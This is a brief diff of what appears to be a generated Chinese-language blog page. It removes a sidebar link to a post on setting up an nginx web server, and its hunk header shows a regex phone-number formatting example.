@@ -2314,10 +2348,6 @@ regex.sub(r&apos;(\2) \3-\4&apos;,&apos;+1 213-867-5309&apos;) //匹配到 (213)
         
           <li>
             <a href="/2018/07/05/nginx负载均衡/">nginx负载均衡</a>
-          </li>
-        
-          <li>
-            <a href="/2018/07/04/nginx搭建web服务器/">nginx搭建web服务器</a>
           </li>
         
       </ul>
